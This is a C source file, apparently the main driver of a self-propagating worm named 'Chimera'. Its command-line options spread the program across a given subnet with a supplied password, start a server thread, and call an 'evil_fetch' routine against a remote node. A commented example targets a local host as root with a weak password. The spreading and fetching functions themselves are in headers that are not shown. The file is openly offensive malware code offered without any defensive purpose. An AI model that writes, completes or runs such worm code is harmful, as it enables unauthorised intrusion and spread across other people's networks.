#include "net.h"

#ifdef __linux__
    #include "server.h"
    #include "client.h"
#endif
// int main() {
    
//     spread_linux("192.168.1.32", "root", "password123");
// }

// Helper function to run spread with subnet and password
void *spread_thread_with_password(void *args) {
    char **arg_array = (char **)args;
    spread(arg_array[0], arg_array[1]);
    return NULL;
}


pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

#if __linux__
    // Helper function to run start_server
    void *start_server_thread(void *args) {
        pthread_mutex_lock(&mutex);
        start_server();
        pthread_mutex_unlock(&mutex);
        return NULL;
    }
#endif

void print_usage() {
    printf("Usage: chimera [OPTIONS]\n");
    printf("Options:\n");
    printf("  -h, --help\t\tPrints this help message and exits.\n");
    printf("  -s, --spread <subnet>\tSpread Chimera to hosts on the specified subnet.\n");
    printf("  -p, --password <password>\tThe password to use for the connection.\n");
    printf("  --establish-node <ip>\t\tEstablish a connection to the specified node.\n");
}

int main(int argc, char* argv[]) {
    char* subnet = NULL;
    char* password = NULL;
    char* establish_node_ip = NULL;

    // Parse command line arguments
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            print_usage();
            return 0;
        } else if (strcmp(argv[i], "-s") == 0 || strcmp(argv[i], "--spread") == 0) {
            if (i + 1 < argc) {
                subnet = argv[i + 1];
                i++;
            } else {
                fprintf(stderr, "Error: -s/--spread option requires an argument\n");
                print_usage();
                return 1;
            }
        } else if (strcmp(argv[i], "-p") == 0 || strcmp(argv[i], "--password") == 0) {
            if (i + 1 < argc) {
                password = argv[i + 1];
                i++;
            } else {
                fprintf(stderr, "Error: -p/--password option requires an argument\n");
                print_usage();
                return 1;
            }
        } else if (strcmp(argv[i], "--establish-node") == 0) {
            if (i + 1 < argc) {
                establish_node_ip = argv[i + 1];
                i++;
                #if __linux__
                    evil_fetch(establish_node_ip);
                #endif
            } else {
                fprintf(stderr, "Error: --establish-node option requires an argument\n");
                print_usage();
                return 1;
            }
        } else {
            fprintf(stderr, "Error: Invalid command line argument %s\n", argv[i]);
            print_usage();
            return 1;
        }
    }

    // Check if the user wants to spread Chimera or establish a connection to a node
    if (subnet != NULL && password != NULL) {
        printf("Spreading Chimera to hosts on subnet %s with password %s\n", subnet, password);

        #if __linux__
            // Start the server asynchronously
            pthread_t server_thread;
            pthread_create(&server_thread, NULL, start_server_thread, NULL);
        #endif

        // Start the spread_thread_with_password asynchronously
        pthread_t spread_thread;
        char *spread_args[2] = {subnet, password};
        pthread_create(&spread_thread, NULL, spread_thread_with_password, (void *)spread_args);

        #if __linux__
            // Wait for both threads to complete
            pthread_join(server_thread, NULL);
        #endif
        pthread_join(spread_thread, NULL);
    } else if (establish_node_ip != NULL) {
        printf("Establishing connection with remote node: %s\n", establish_node_ip);
        //establish_node(establish_node_ip);
    } else {
        fprintf(stderr, "Error: Invalid command line arguments\n");
        print_usage();
        return 1;
    }

    return 0;
}
